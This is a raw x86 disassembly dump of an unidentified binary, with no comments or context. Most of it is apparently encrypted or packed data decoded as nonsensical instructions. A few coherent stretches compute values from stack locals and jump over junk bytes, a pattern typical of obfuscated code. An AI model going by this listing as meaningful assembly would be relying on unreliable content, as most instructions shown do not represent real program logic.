  40c802:	adc    dh,BYTE PTR [eax]
  40c804:	retf   
  40c805:	dec    ebx
  40c806:	sar    DWORD PTR [ebx+ecx*4+0x68],1
  40c80a:	mov    esi,0xc10ff3f9
  40c80f:	add    eax,0x8e586b43
  40c814:	addr16 call 0xce39:0x880b5485
  40c81c:	mov    edi,0xfbbce685
  40c821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c822:	outs   dx,BYTE PTR ds:[esi]
  40c823:	sbb    BYTE PTR [edx],0x5d
  40c826:	into   
  40c827:	repz in eax,0xa0
  40c82a:	xor    esi,DWORD PTR [ecx]
  40c82c:	sub    ebp,esp
  40c82e:	lods   al,BYTE PTR ds:[esi]
  40c82f:	out    dx,eax
  40c830:	mov    ch,0x1f
  40c832:	adc    edx,eax
  40c834:	ret    0x1e0b
  40c837:	mov    al,0x34
  40c839:	pop    ss
  40c83a:	push   edi
  40c83b:	stos   DWORD PTR es:[edi],eax
  40c83c:	adc    edx,DWORD PTR [ebx]
  40c83e:	add    al,0xff
  40c840:	or     edi,DWORD PTR [esi]
  40c842:	stc    
  40c843:	xchg   ebp,eax
  40c844:	sahf   
  40c845:	dec    ebx
  40c846:	fld    TBYTE PTR [eax-0x29]
  40c849:	stos   BYTE PTR es:[edi],al
  40c84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c84b:	lds    ecx,FWORD PTR [edi]
  40c84d:	rol    DWORD PTR [esi-0x59],0xe4
  40c851:	fdiv   st,st(2)
  40c853:	xchg   DWORD PTR [ebp+esi*4-0x3897480c],ebx
  40c85a:	icebp  
  40c85b:	sbb    DWORD PTR [eax+0x7b28642e],0xd94f5b00
  40c865:	js     0x40c869
  40c867:	sub    esp,ebx
  40c869:	mov    esi,0x759bc364
  40c86e:	add    al,0x91
  40c870:	pop    es
  40c871:	xchg   esp,edx
  40c873:	pop    es
  40c874:	mov    cl,BYTE PTR [ebp-0x4ad4da63]
  40c87a:	mov    esi,0xe0b73b99
  40c87f:	das    
  40c880:	push   eax
  40c881:	out    dx,al
  40c882:	jbe    0x40c883
  40c884:	jno    0x40c81d
  40c886:	xchg   DWORD PTR [edx+eax*4],edi
  40c889:	and    BYTE PTR [ebx],cl
  40c88b:	lock and DWORD PTR [ebx-0x1336ccaa],edx
  40c892:	scas   eax,DWORD PTR es:[edi]
  40c893:	loope  0x40c867
  40c895:	adc    ch,0x79
  40c898:	mov    ah,0x30
  40c89a:	xchg   BYTE PTR [edi-0x2a],cl
  40c89d:	xor    BYTE PTR [edi],bl
  40c89f:	push   edx
  40c8a0:	nop    DWORD PTR [eax+esi*1+0x54]
  40c8a5:	ins    BYTE PTR es:[edi],dx
  40c8a6:	mov    BYTE PTR [eax-0x22820685],cl
  40c8ac:	outs   dx,BYTE PTR ds:[esi]
  40c8ad:	mov    ebp,0xb6ca3bd9
  40c8b2:	fs push edx
  40c8b4:	sbb    eax,0x2bea3329
  40c8b9:	jmp    0x40c912
  40c8bb:	call   FWORD PTR [edi+eax*2+0x97a5f43]
  40c8c2:	into   
  40c8c3:	retf   0x8d41
  40c8c6:	mov    esp,DWORD PTR [ecx]
  40c8c8:	test   eax,edx
  40c8ca:	in     eax,0x7c
  40c8cc:	mov    esp,0xcd9b295d
  40c8d1:	cmp    dh,BYTE PTR [esi]
  40c8d3:	inc    esp
  40c8d4:	arpl   WORD PTR [ebp-0x1],dx
  40c8d7:	mov    dl,0x19
  40c8d9:	into   
  40c8da:	fldcw  WORD PTR [esi]
  40c8dc:	dec    cl
  40c8de:	jae    0x40c950
  40c8e0:	mov    eax,ds:0x4c67521c
  40c8e5:	in     eax,dx
  40c8e6:	clc    
  40c8e7:	cmp    dl,BYTE PTR [ecx]
  40c8e9:	js     0x40c937
  40c8eb:	test   DWORD PTR [edi],edx
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	repz icebp 
  40c91a:	or     al,0x87
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8c1
  40c925:	rcl    DWORD PTR [eax+0x1],0xc4
  40c929:	xor    dl,ch
  40c92b:	jmp    0x40c943
  40c92d:	shl    DWORD PTR [ebx+0x6c],cl
  40c930:	mov    ebx,0x79e8fcc8
  40c935:	repnz mov al,0xac
  40c938:	in     al,dx
  40c939:	int3   
  40c93a:	loopne 0x40c924
  40c93c:	mov    eax,ds:0xa1065633
  40c941:	sub    al,0xa4
  40c943:	mov    eax,DWORD PTR [ecx+0xd747651]
  40c949:	push   ss
  40c94a:	pop    ebp
  40c94b:	test   DWORD PTR [esi-0x11],edi
  40c94e:	dec    ecx
  40c94f:	in     eax,0xcf
  40c951:	or     dh,BYTE PTR [ebp-0x3a]
  40c954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c955:	jp     0x40c90c
  40c957:	lods   eax,DWORD PTR ds:[esi]
  40c958:	inc    ebx
  40c959:	sbb    ecx,DWORD PTR [ebp+0x2b]
  40c95c:	icebp  
  40c95d:	shl    DWORD PTR [edi-0x3bda2ff],1
  40c963:	das    
  40c964:	pop    ebx
  40c965:	pop    ss
  40c966:	stos   DWORD PTR es:[edi],eax
  40c967:	inc    ebp
  40c968:	aas    
  40c969:	add    BYTE PTR [edi+0x3e],ah
  40c96c:	cmp    al,0x71
  40c96e:	sub    ecx,DWORD PTR [ecx+0x1969e97d]
  40c974:	jb     0x40c9a3
  40c976:	rol    cl,1
  40c978:	aas    
  40c979:	pop    ss
  40c97a:	aas    
  40c97b:	dec    eax
  40c97c:	int3   
  40c97d:	mov    ds:0x9290a58f,al
  40c982:	out    0x9d,eax
  40c984:	fwait
  40c985:	pop    esp
  40c986:	add    bl,BYTE PTR [esi-0x2f]
  40c989:	outs   dx,BYTE PTR ds:[esi]
  40c98a:	cmp    al,0xfd
  40c98c:	xchg   BYTE PTR [edx-0x6],bh
  40c98f:	pop    esp
  40c990:	add    al,BYTE PTR [esi+0x33]
  40c993:	pop    es
  40c994:	fnstenv [esi-0xc]
  40c997:	push   ecx
  40c998:	inc    eax
  40c999:	je     0x40c9b8
  40c99b:	arpl   dx,bx
  40c99d:	cmp    ecx,DWORD PTR [ebx+0x499e88d0]
  40c9a3:	add    al,BYTE PTR [eax+0x73]
  40c9a6:	enter  0xef74,0x9d
  40c9aa:	inc    ebx
  40c9ab:	adc    eax,0xb8e355e8
  40c9b0:	sbb    BYTE PTR [ebx-0x644993f2],cl
  40c9b6:	test   DWORD PTR [eax],esi
  40c9b8:	push   0x14f10afe
  40c9bd:	and    dl,al
  40c9bf:	xchg   edx,eax
  40c9c0:	iret   
  40c9c1:	int    0xb7
  40c9c3:	or     DWORD PTR ds:0x840d990c,edi
  40c9c9:	inc    edi
  40c9ca:	call   0x9be86b1c
  40c9cf:	dec    edi
  40c9d0:	add    DWORD PTR [edi],edx
  40c9d2:	out    0xb,al
  40c9d4:	and    eax,0x97fe80e5
  40c9d9:	bound  ecx,QWORD PTR [esi*2+0x600d0b3d]
  40c9e0:	jo     0x40c9e5
  40c9e2:	push   es
  40c9e3:	xor    esi,DWORD PTR [edi+ebp*2-0x6b717aff]
  40c9ea:	inc    edx
  40c9eb:	mov    al,BYTE PTR [ebx]
  40c9ed:	add    BYTE PTR [edx-0x2cfe327e],dh
  40c9f3:	mov    DWORD PTR [eax+0x66],ebx
  40c9f6:	popf   
  40c9f7:	lahf   
  40c9f8:	test   DWORD PTR [edi+0x7],ecx
  40c9fb:	jecxz  0x40c992
  40c9fd:	ins    BYTE PTR es:[edi],dx
  40c9fe:	repz and al,BYTE PTR [edi+edi*1+0x55]
  40ca03:	lods   al,BYTE PTR ds:[esi]
  40ca04:	mov    WORD PTR [edx+ebx*2+0x30eb3337],cs
  40ca0b:	xchg   ebx,eax
  40ca0c:	in     eax,0x1c
  40ca0e:	or     eax,0x3d5b7600
  40ca13:	fs mov al,0xde
  40ca16:	and    bh,BYTE PTR [ebp+0x50]
  40ca19:	mov    edx,0x8843d5a
  40ca1e:	push   ecx
  40ca1f:	fld    st(2)
  40ca21:	or     eax,0xfe73df94
  40ca26:	fidivr WORD PTR [eax+0x28075b50]
  40ca2c:	pop    ds
  40ca2d:	mov    BYTE PTR [esi-0x7fe1bd1],dl
  40ca33:	mov    eax,ds:0xef0517cd
  40ca38:	jne    0x40ca7c
  40ca3a:	leave  
  40ca3b:	icebp  
  40ca3c:	xor    BYTE PTR [ecx],al
  40ca3e:	dec    ebx
  40ca3f:	imul   esi,ebx,0x84e6983a
  40ca45:	ds aas 
  40ca47:	sahf   
  40ca48:	dec    DWORD PTR [edi]
  40ca4a:	fcmovne st,st(6)
  40ca4c:	test   BYTE PTR [ebx+0x64c28ee3],bl
  40ca52:	sbb    al,0x4e
  40ca54:	xchg   edx,eax
  40ca55:	or     ebp,DWORD PTR [ebx-0x53dbcc66]
  40ca5b:	loopne 0x40c9ea
  40ca5d:	ds aam 0x8d
  40ca60:	jecxz  0x40cabf
  40ca62:	push   esi
  40ca63:	stos   DWORD PTR es:[edi],eax
  40ca64:	jnp    0x40ca8d
  40ca66:	(bad)  
  40ca67:	sub    eax,0x155615f2
  40ca6c:	sahf   
  40ca6d:	shl    BYTE PTR [ebx],0x44
  40ca70:	sub    DWORD PTR [eax],ebx
  40ca72:	sbb    bh,BYTE PTR [eax-0x64]
  40ca75:	call   FWORD PTR [ecx-0xf01595f]
  40ca7b:	fimul  DWORD PTR [esi+eiz*8+0x69]
  40ca7f:	dec    esp
  40ca80:	pop    ds
  40ca81:	push   ds
  40ca82:	fbstp  TBYTE PTR [esi-0x45ded359]
  40ca88:	pop    ds
  40ca89:	sub    ebp,DWORD PTR [ecx]
  40ca8b:	dec    ebp
  40ca8c:	stos   BYTE PTR es:[edi],al
  40ca8d:	jbe    0x40ca62
  40ca8f:	dec    esp
  40ca90:	add    ah,dh
  40ca92:	jmp    0xcd0eb7aa
  40ca97:	pop    ss
  40ca98:	jmp    0xf704ecbe
  40ca9d:	mov    eax,ds:0x2a1e927e
  40caa2:	jmp    0xc9db:0xd32412d8
  40caa9:	sub    bh,BYTE PTR [esi+0x69ed743f]
  40caaf:	jg     0x40caab
  40cab1:	repz jmp 0x40cabe
  40cab4:	jae    0x40ca8d
  40cab6:	push   esp
  40cab7:	aaa    
  40cab8:	loopne 0x40ca85
  40caba:	dec    esi
  40cabb:	xlat   BYTE PTR ds:[ebx]
  40cabc:	xor    edi,edi
  40cabe:	sbb    al,0xfd
  40cac0:	cwde   
  40cac1:	push   ebp
  40cac2:	mov    al,0xf7
  40cac4:	mov    dl,0xd5
  40cac6:	sbb    al,0x2
  40cac8:	mov    eax,ds:0xf0120073
  40cacd:	fild   DWORD PTR ds:0x6c2b6464
  40cad3:	push   edi
  40cad4:	ins    DWORD PTR es:[edi],dx
  40cad5:	in     eax,0xe8
  40cad7:	pop    edi
  40cad8:	or     eax,0xddbdf1f
  40cadd:	fadd   st(5),st
  40cadf:	xchg   BYTE PTR [ebx+ecx*2-0x16],cl
  40cae3:	xchg   ecx,eax
  40cae4:	cmp    esp,eax
  40cae6:	jbe    0x40ca73
  40cae8:	cld    
  40cae9:	push   0x37f55f82
  40caee:	ja     0x40cae2
  40caf0:	daa    
  40caf1:	sti    
  40caf2:	hlt    
  40caf3:	ret    0xbe01
  40caf6:	ret    
  40caf7:	jno    0x40cae7
  40caf9:	stc    
  40cafa:	xchg   edx,eax
  40cafb:	xchg   edx,eax
  40cafc:	push   ss
  40cafd:	outs   dx,BYTE PTR ds:[esi]
  40cafe:	sub    dl,BYTE PTR [ecx+0x3ec92d49]
  40cb04:	sti    
  40cb05:	sbb    al,0x45
  40cb07:	sar    DWORD PTR [edi+0x72],cl
  40cb0a:	stos   BYTE PTR es:[edi],al
  40cb0b:	gs jne 0x40cb57
  40cb0e:	ss pop esi
  40cb10:	xlat   BYTE PTR ds:[ebx]
  40cb11:	pop    esi
  40cb12:	aam    0x3f
  40cb14:	mov    ds:0x5dac6b43,al
  40cb19:	imul   edi,DWORD PTR [edx+edi*4+0x2b],0xbe79f36d
  40cb21:	adc    BYTE PTR [eax],0xf6
  40cb24:	repnz mov ch,0x5c
  40cb27:	outs   dx,DWORD PTR ds:[esi]
  40cb28:	enter  0x7874,0x5f
  40cb2c:	ret    0xe4fc
  40cb2f:	stos   DWORD PTR es:[edi],eax
  40cb30:	inc    esi
  40cb31:	iret   
  40cb32:	out    0xac,eax
  40cb34:	out    dx,al
  40cb35:	rcl    DWORD PTR [edi],1
  40cb37:	cmp    edi,edi
  40cb39:	gs jl  0x40cb1c
  40cb3c:	pop    edx
  40cb3d:	cld    
  40cb3e:	test   DWORD PTR [eax],edi
  40cb40:	cmp    edx,DWORD PTR [eax]
  40cb42:	mov    esp,0xa8b19266
  40cb47:	aam    0xc4
  40cb49:	shr    BYTE PTR [edx-0x67],0xa0
  40cb4d:	xchg   ebx,eax
  40cb4e:	jge    0x40cad9
  40cb50:	lea    ebx,[esi]
  40cb52:	fisub  DWORD PTR [eax-0x8fab4ff]
  40cb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb59:	stos   DWORD PTR es:[edi],eax
  40cb5a:	add    BYTE PTR [edx+0x32],bl
  40cb5d:	xchg   esp,eax
  40cb5e:	fsub   DWORD PTR [edi]
  40cb60:	xchg   DWORD PTR [edx],edi
  40cb62:	stc    
  40cb63:	add    BYTE PTR [edx],dh
  40cb65:	pop    ss
  40cb66:	adc    esi,DWORD PTR [eax+0x3f]
  40cb69:	rcl    DWORD PTR [esi],0xfd
  40cb6c:	xchg   esi,eax
  40cb6d:	outs   dx,DWORD PTR ds:[esi]
  40cb6e:	push   eax
  40cb6f:	inc    edi
  40cb70:	ins    BYTE PTR es:[edi],dx
  40cb71:	mov    ebp,0x4e40a1a5
  40cb76:	mov    cs,WORD PTR [edx-0xf1fa1a3]
  40cb7c:	outs   dx,DWORD PTR ds:[esi]
  40cb7d:	shr    BYTE PTR [ecx+0x27],cl
  40cb80:	jne    0x40cbdd
  40cb82:	adc    DWORD PTR [esi-0x370f80ac],edi
  40cb88:	pushf  
  40cb89:	imul   ebx,esp,0x7dd6c1af
  40cb8f:	loop   0x40cb1e
  40cb91:	stos   BYTE PTR es:[edi],al
  40cb92:	adc    eax,0xe5272c48
  40cb97:	or     DWORD PTR [edi],esp
  40cb99:	pop    esp
  40cb9a:	neg    DWORD PTR [ebp+eax*1-0x38aced2b]
  40cba1:	shl    BYTE PTR [eax+0x4d],0x51
  40cba5:	and    BYTE PTR [edx],ch
  40cba7:	into   
  40cba8:	sbb    BYTE PTR [edi+eax*4-0x32b158d4],dl
  40cbaf:	in     al,dx
  40cbb0:	or     eax,0x8ec8ac5c
  40cbb5:	xchg   ebp,eax
  40cbb6:	test   BYTE PTR [edx+0x48f712f4],al
  40cbbc:	mov    eax,0xfa1c63d8
  40cbc1:	mov    ebp,0x2e2998b7
  40cbc6:	ret    0x2a3f
  40cbc9:	cld    
  40cbca:	or     eax,0xb05fc0e5
  40cbcf:	fdivr  QWORD PTR [ecx]
  40cbd1:	inc    ebp
  40cbd2:	fsubr  QWORD PTR [esi-0x4cbbdee]
  40cbd8:	aad    0x76
  40cbda:	iret   
  40cbdb:	pop    esi
  40cbdc:	loope  0x40cb68
  40cbde:	xor    eax,0xeb26478b
  40cbe3:	shl    BYTE PTR [ecx],1
  40cbe5:	shl    al,1
  40cbe7:	xchg   edx,eax
  40cbe8:	sub    DWORD PTR [ecx],eax
  40cbea:	test   DWORD PTR [edi-0x51cc8f6d],ebx
  40cbf0:	and    DWORD PTR [ebp+0xa20881],ebx
  40cbf6:	pop    ecx
  40cbf7:	jae    0x40cbe8
  40cbf9:	push   edi
  40cbfa:	dec    ebp
  40cbfb:	mov    eax,ebx
  40cbfd:	mov    al,ds:0x64abe544
  40cc02:	push   ecx
  40cc03:	lahf   
  40cc04:	lods   al,BYTE PTR ds:[esi]
  40cc05:	xchg   ebp,eax
  40cc06:	(bad)  
  40cc07:	push   ebp
  40cc08:	inc    esi
  40cc09:	and    BYTE PTR [ecx+0x4e],dl
  40cc0c:	mov    eax,ds:0x575cd186
  40cc11:	jmp    0x30251abe
  40cc16:	loope  0x40cc66
  40cc18:	fwait
  40cc19:	fs jg  0x40cbe6
  40cc1c:	aas    
  40cc1d:	xchg   esi,eax
  40cc1e:	lds    edx,FWORD PTR [ebx*1+0x2cdf4b9b]
  40cc25:	adc    DWORD PTR [edi],ecx
  40cc27:	or     ch,BYTE PTR [edi-0xd]
  40cc2a:	lods   eax,DWORD PTR ds:[esi]
  40cc2b:	jmp    0x40cc5a
  40cc2d:	jg     0x40cc87
  40cc2f:	aad    0xa3
  40cc31:	adc    ebp,DWORD PTR [ebx-0x1c]
  40cc34:	xlat   BYTE PTR ds:[ebx]
  40cc35:	pop    es
  40cc36:	fwait
  40cc37:	loop   0x40cc4f
  40cc39:	inc    esp
  40cc3a:	iret   
  40cc3b:	iret   
  40cc3c:	fcmovbe st,st(5)
  40cc3e:	jb     0x40cbd0
  40cc40:	xor    DWORD PTR [edi],0x51ae1b0f
  40cc46:	inc    eax
  40cc47:	jg     0x40cbe9
  40cc49:	jp     0x40cca4
  40cc4b:	mov    ebx,edx
  40cc4d:	jb     0x40cbf4
  40cc4f:	mov    ss,WORD PTR [esi-0x58bb3d18]
  40cc55:	out    0x2f,al
  40cc57:	pop    esi
  40cc58:	enter  0xbf32,0x5d
  40cc5c:	xchg   ecx,eax
  40cc5d:	sti    
  40cc5e:	ins    DWORD PTR es:[edi],dx
  40cc5f:	jmp    0x25e3b565
  40cc64:	inc    ebp
  40cc65:	sub    BYTE PTR [esi],dh
  40cc67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc68:	into   
  40cc69:	nop
  40cc6a:	rep outs dx,BYTE PTR ds:[esi]
  40cc6c:	pop    ss
  40cc6d:	fsub   QWORD PTR [ecx]
  40cc6f:	pop    ds
  40cc70:	stos   DWORD PTR es:[edi],eax
  40cc71:	sar    BYTE PTR ds:0xc0ceb5ed,1
  40cc77:	and    ch,BYTE PTR [eax-0x53]
  40cc7a:	pop    esp
  40cc7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc7c:	retf   
  40cc7d:	das    
  40cc7e:	cli    
  40cc7f:	repnz adc BYTE PTR [esi-0x12],bh
  40cc83:	int3   
  40cc84:	ds and eax,0xbeaf1dfb
  40cc8a:	jmp    0x8a63:0xad4e04fb
  40cc91:	sub    eax,0x19982be2
  40cc96:	in     eax,0xf8
  40cc98:	dec    eax
  40cc99:	mov    ch,0xa0
  40cc9b:	js     0x40ccfb
  40cc9d:	cld    
  40cc9e:	pop    edx
  40cc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca0:	add    al,0x2a
  40cca2:	or     ecx,DWORD PTR [eax+0x359b7cb6]
  40cca8:	xchg   DWORD PTR [ecx+esi*2-0x5f],esp
  40ccac:	std    
  40ccad:	mov    ebx,0x80d121ee
  40ccb2:	and    bh,ah
  40ccb4:	loopne 0x40cce3
  40ccb6:	mov    dh,0x0
  40ccb8:	mov    dh,0x8d
  40ccba:	lds    esi,FWORD PTR [edi]
  40ccbc:	psrlw  mm6,QWORD PTR [ecx]
  40ccbf:	and    ebx,DWORD PTR [esi+0x20223942]
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    DWORD PTR [ecx],0x33
  40cd18:	mov    edi,0x70900be8
  40cd1d:	jo     0x40ccbe
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccef
  40cd23:	mov    bl,0x50
  40cd25:	add    al,0x1b
  40cd27:	in     al,dx
  40cd28:	mov    eax,ds:0xbb3f1534
  40cd2d:	aaa    
  40cd2e:	cmp    al,0x4d
  40cd30:	icebp  
  40cd31:	jmp    0x202e6281
  40cd36:	lea    ecx,[ecx]
  40cd38:	ret    0x7317
  40cd3b:	jg     0x40cdaf
  40cd3d:	(bad)  
  40cd3e:	(bad)  
  40cd40:	xchg   ebp,eax
  40cd41:	cmp    eax,0x2066bc6a
  40cd46:	xor    ah,BYTE PTR [eax-0x1]
  40cd49:	cli    
  40cd4a:	sbb    ebx,DWORD PTR ds:0xb46a17b8
  40cd50:	adc    ebx,DWORD PTR [ebx+0x78465f58]
  40cd56:	adc    BYTE PTR [edx+ebp*1-0x6e],0x96
  40cd5b:	and    al,0x9d
  40cd5d:	push   esp
  40cd5e:	clc    
  40cd5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd60:	sub    DWORD PTR [esi],eax
  40cd62:	jne    0x40cd37
  40cd64:	out    0x43,al
  40cd66:	jmp    0x40cd1a
  40cd68:	gs je  0x40cdb8
  40cd6b:	aas    
  40cd6c:	xchg   ebp,eax
  40cd6d:	mov    al,ds:0x9c617244
  40cd72:	loopne 0x40cd7d
  40cd74:	pushf  
  40cd75:	jge    0x40cd4f
  40cd77:	lahf   
  40cd78:	push   ss
  40cd79:	pop    esp
  40cd7a:	push   edi
  40cd7b:	or     eax,0x27718114
  40cd80:	sub    al,0x6e
  40cd82:	cld    
  40cd83:	xchg   eax,esi
  40cd85:	and    dl,BYTE PTR [eax-0x8a7f269]
  40cd8b:	in     al,dx
  40cd8c:	das    
  40cd8d:	stos   DWORD PTR es:[edi],eax
  40cd8e:	sbb    eax,0x67a096a5
  40cd93:	xor    ah,al
  40cd95:	cdq    
  40cd96:	xchg   BYTE PTR [ecx],dh
  40cd98:	mov    al,ds:0x9f4a8f71
  40cd9d:	inc    esp
  40cd9e:	sub    al,0xee
  40cda0:	push   es
  40cda1:	ds enter 0x27a2,0x32
  40cda6:	pop    es
  40cda7:	adc    edi,edi
  40cda9:	inc    esp
  40cdaa:	cdq    
  40cdab:	mul    edx
  40cdad:	or     DWORD PTR [edx],0x62d556a3
  40cdb3:	and    DWORD PTR [eax-0x1],ebx
  40cdb6:	out    0x2b,eax
  40cdb8:	les    ebp,FWORD PTR [edi-0x2a83bd03]
  40cdbe:	cli    
  40cdbf:	scas   eax,DWORD PTR es:[di]
  40cdc1:	loopne 0x40cd52
  40cdc3:	pop    ecx
  40cdc4:	pop    ebp
  40cdc5:	push   esp
  40cdc6:	gs push 0xffffffce
  40cdc9:	int3   
  40cdca:	mov    al,0x8b
  40cdcc:	mov    ecx,0xa0e186f8
  40cdd1:	adc    BYTE PTR [edi],ch
  40cdd3:	cli    
  40cdd4:	add    DWORD PTR ds:0x784feff4,ebx
  40cdda:	aad    0x41
  40cddc:	in     eax,dx
  40cddd:	dec    ecx
  40cdde:	pop    DWORD PTR [edi+0x38eb09c9]
  40cde4:	lock mov esi,gs
  40cde7:	inc    ebp
  40cde8:	pop    ecx
  40cde9:	xor    al,0xbf
  40cdeb:	imul   edi,ebp,0xffffff84
  40cdee:	push   ecx
  40cdef:	ins    BYTE PTR es:[edi],dx
  40cdf0:	fcom   QWORD PTR [ecx]
  40cdf2:	push   es
  40cdf3:	xchg   ebx,eax
  40cdf4:	repnz shl ch,0xbb
  40cdf8:	mov    ebp,DWORD PTR [ebp+0x55]
  40cdfb:	stc    
  40cdfc:	scas   eax,DWORD PTR es:[edi]
  40cdfd:	outs   dx,DWORD PTR ds:[esi]
  40cdfe:	mov    edx,0x52f924d5
  40ce03:	js     0x40cdf5
  40ce05:	out    dx,eax
  40ce06:	pop    es
  40ce07:	xchg   edi,eax
  40ce08:	adc    al,0xd1
  40ce0a:	pop    ss
  40ce0b:	inc    ecx
  40ce0c:	push   0x8e92c900
  40ce11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce12:	xchg   edx,eax
  40ce13:	add    ecx,DWORD PTR [edx]
  40ce15:	cli    
  40ce16:	xchg   ecx,eax
  40ce17:	jp     0x40cdb9
  40ce19:	cmp    dl,BYTE PTR [eax+0x1]
  40ce1c:	and    BYTE PTR ds:0xe39746b8,bl
  40ce22:	popf   
  40ce23:	fwait
  40ce24:	mov    ah,0xa1
  40ce26:	(bad)  
  40ce27:	lock xchg BYTE PTR [eax-0x3e],cl
  40ce2b:	or     eax,0x16d1b81b
  40ce30:	jae    0x40cdbf
  40ce32:	(bad)  
  40ce33:	pop    ss
  40ce34:	push   esi
  40ce35:	fld    st(1)
  40ce37:	dec    esp
  40ce38:	jnp    0x40ce07
  40ce3a:	or     DWORD PTR [ebp+0x2863c61f],esi
  40ce40:	mov    edi,0xe1cceeef
  40ce45:	xor    DWORD PTR [edx+0x32],esi
  40ce48:	loope  0x40ce29
  40ce4a:	mov    bh,0xca
  40ce4c:	jmp    FWORD PTR [ebx+ecx*4+0x1289d4cd]
  40ce53:	pop    ecx
  40ce54:	mov    DWORD PTR [ebx+0x503e4a86],0x79dcedc9
  40ce5e:	(bad)  
  40ce5f:	lahf   
  40ce60:	or     eax,0x8fb6d86a
  40ce65:	cli    
  40ce66:	loopne 0x40ce83
  40ce68:	or     ch,cl
  40ce6a:	(bad)  
  40ce6b:	(bad)  
  40ce6c:	cmp    DWORD PTR [edx-0x1d5071ec],ecx
  40ce72:	leave  
  40ce73:	dec    esp
  40ce74:	cmp    ecx,DWORD PTR [edx]
  40ce76:	inc    esi
  40ce77:	aam    0xb5
  40ce79:	xor    eax,0x185c5e0f
  40ce7e:	sub    edx,esp
  40ce80:	add    al,dl
  40ce82:	xlat   BYTE PTR ds:[ebx]
  40ce83:	int    0x19
  40ce85:	jae    0x40ce59
  40ce87:	sub    BYTE PTR [eax-0x2c548de3],bl
  40ce8d:	add    BYTE PTR [edi+0x3ea1576f],ch
  40ce93:	and    edx,0x16
  40ce96:	cmc    
  40ce97:	fist   DWORD PTR [ecx-0x7f]
  40ce9a:	dec    edx
  40ce9b:	jge    0x40ce9b
  40ce9d:	pop    ecx
  40ce9e:	outs   dx,BYTE PTR ds:[esi]
  40ce9f:	push   esi
  40cea0:	jle    0x40cea6
  40cea2:	and    ebp,DWORD PTR [ebx]
  40cea4:	mov    ebp,0x7e21bf37
  40cea9:	jge    0x40ced9
  40ceab:	ret    
  40ceac:	or     ebp,edx
  40ceae:	mov    ecx,0xe3529a74
  40ceb3:	pop    ebx
  40ceb4:	xor    bh,BYTE PTR [edi+0x3f102ec]
  40ceba:	into   
  40cebb:	mov    al,ds:0xabef1c5f
  40cec0:	cs int3 
  40cec2:	fimul  WORD PTR [edx-0x6f]
  40cec5:	loop   0x40ce90
  40cec7:	(bad)  
  40cec8:	mov    cl,0xde
  40ceca:	jo     0x40cf1e
  40cecc:	add    dl,ah
  40cece:	xchg   ebp,eax
  40cecf:	test   DWORD PTR [ebp-0x2],ecx
  40ced2:	outs   dx,BYTE PTR ds:[esi]
  40ced3:	mov    BYTE PTR [edx-0x7d],ch
  40ced6:	fidivr WORD PTR [esi+ecx*4+0x30]
  40ceda:	jno    0x40cec1
  40cedc:	adc    eax,DWORD PTR [edx-0x1f]
  40cedf:	and    cl,BYTE PTR [eax+0x4f]
  40cee2:	sbb    eax,DWORD PTR [eax]
  40cee4:	xchg   esi,eax
  40cee5:	in     al,0xa4
  40cee7:	cmp    BYTE PTR [ecx+0x71],ch
  40ceea:	push   ss
  40ceeb:	sub    BYTE PTR [esi],ch
  40ceed:	cmp    al,0x7a
  40ceef:	or     ch,BYTE PTR [edi]
  40cef1:	xchg   esi,eax
  40cef2:	test   DWORD PTR [ebx],eax
  40cef4:	mov    ss,WORD PTR [ebp+0x7efefba1]
  40cefa:	es pop esi
  40cefc:	push   esi
  40cefd:	mov    BYTE PTR [eax+0x494cbb8c],bh
  40cf03:	jl     0x40ce9e
  40cf05:	xor    BYTE PTR [esi-0x14],cl
  40cf08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf09:	pop    ds
  40cf0a:	hlt    
  40cf0b:	mov    ah,0xd
  40cf0d:	adc    al,0x46
  40cf0f:	mov    ecx,es
